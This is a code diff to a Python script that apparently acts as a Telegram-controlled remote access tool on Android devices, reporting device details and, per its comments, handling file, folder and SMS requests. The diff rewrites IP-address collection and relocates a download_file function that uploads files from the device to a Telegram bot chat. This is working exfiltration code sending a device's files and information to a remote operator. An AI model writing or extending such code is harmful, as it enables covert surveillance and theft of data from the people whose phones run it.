@@ -78,11 +78,16 @@ def get_device_info():
         except subprocess.CalledProcessError:
             device_info['Battery'] = "Error retrieving battery status."
 
-        # Get IP Address using termux command
+        # Get IP Address using alternative commands
         try:
-            ip_address = subprocess.check_output(['termux-wifi-info']).decode().strip()
+            ip_result = subprocess.check_output(['ip', 'addr']).decode().strip()
+            ip_address = "Unable to retrieve IP address."
+            for line in ip_result.split('\n'):
+                if 'inet ' in line:
+                    ip_address = line.split()[1].split('/')[0]
+                    break
             device_info['IP Address'] = ip_address
-        except subprocess.CalledProcessError:
+        except (subprocess.CalledProcessError, FileNotFoundError):
             device_info['IP Address'] = "Unable to retrieve IP address."
 
         # Format the device info for Telegram
@@ -114,27 +119,6 @@ def handle_folder_navigation(folder_name):
     except Exception as e:
         send_to_telegram(f"Error navigating folder: {str(e)}")
 
-# Function to download a specific file
-def download_file(file_name):
-    try:
-        file_path = os.path.join(current_folder, file_name)
-        
-        if os.path.isfile(file_path):
-            # Send the file to Telegram
-            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-            files = {'document': open(file_path, 'rb')}
-            data = {"chat_id": CHAT_ID}
-            response = requests.post(url, files=files, data=data)
-            
-            if response.status_code == 200:
-                return f"File `{file_name}` sent successfully!"
-            else:
-                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
-        else:
-            return f"File `{file_name}` does not exist or is not a valid file."
-    except Exception as e:
-        return f"Error downloading file: {str(e)}"
-
 # Telegram bot logic to handle file, folder, SMS, and device requests
 def handle_telegram_update(update):
     try:
@@ -164,6 +148,27 @@ def handle_telegram_update(update):
     
     except Exception as e:
         send_to_telegram(f"Error in Telegram update: {str(e)}")
+
+# Function to download a specific file
+def download_file(file_name):
+    try:
+        file_path = os.path.join(current_folder, file_name)
+        
+        if os.path.isfile(file_path):
+            # Send the file to Telegram
+            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+            files = {'document': open(file_path, 'rb')}
+            data = {"chat_id": CHAT_ID}
+            response = requests.post(url, files=files, data=data)
+            
+            if response.status_code == 200:
+                return f"File `{file_name}` sent successfully!"
+            else:
+                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
+        else:
+            return f"File `{file_name}` does not exist or is not a valid file."
+    except Exception as e:
+        return f"Error downloading file: {str(e)}"
 
 # Example of how to handle incoming Telegram updates
 def listen_for_updates():
